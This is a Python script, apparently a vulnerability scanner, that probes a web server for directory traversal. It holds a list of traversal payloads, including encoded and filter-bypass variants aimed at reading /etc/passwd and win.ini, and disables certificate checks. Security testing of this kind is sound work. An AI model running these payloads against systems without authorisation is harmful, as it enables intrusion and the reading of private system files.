
import requests
import urllib3

# This hides annoying terminal warnings if we scan a site with a bad SSL certificate
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run_dir_traversal_scan(target_url: str) -> dict:
    payloads = [
        # 1. Standard Traversal
        "../../../../../../../../etc/passwd",
        "../../../../../../../../windows/win.ini",
        
        # 2. URL Encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        
        # 3. Double URL Encoded (WAF Bypass)
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # 4. Nested/Stripper Bypass
        "....//....//....//....//etc/passwd",
        
        # 5. Null Byte Injections
        "../../../../../../../../etc/passwd%00",
        "../../../../../../../../windows/win.ini%00.png",
        
        # 6. Absolute Paths
        "/etc/passwd",
        "C:\\windows\\win.ini"
    ]
    
    details = []
    
    # URL FORMATTING: Ensure the URL always has a trailing slash
    base_url = target_url if target_url.endswith('/') else f"{target_url}/"

    for payload in payloads:
        # CRITICAL: We use raw addition (+) instead of urljoin() so Python 
        # doesn't automatically erase our "../" characters before sending.
        test_url = base_url + payload
        
        try:
            # We use verify=False so the scanner doesn't crash on self-signed certs
            response = requests.get(test_url, timeout=5, verify=False)
            
            # Signature matching for Linux (root:x:) and Windows ([extensions])
            if "root:x:0:0" in response.text or "[extensions]" in response.text:
                details.append({
                    "type": "Directory Traversal",
                    "payload_used": payload,
                    "severity": "High",
                    "description": f"Successfully read local system files using this path traversal payload."
                })
                # We proved it's vulnerable; no need to spam the remaining payloads
                break 
                
        except requests.RequestException:
            # If the server drops the connection, we just move on to the next payload
            continue

    return {
        "scanner_name": "Advanced Directory Traversal Scanner",
        "target_url": target_url,
        "vulnerabilities_found": len(details),
        "details": details
    }

if __name__ == "__main__":
    import json
    result = run_dir_traversal_scan("http://scanme.nmap.org")
    print(json.dumps(result, indent=4))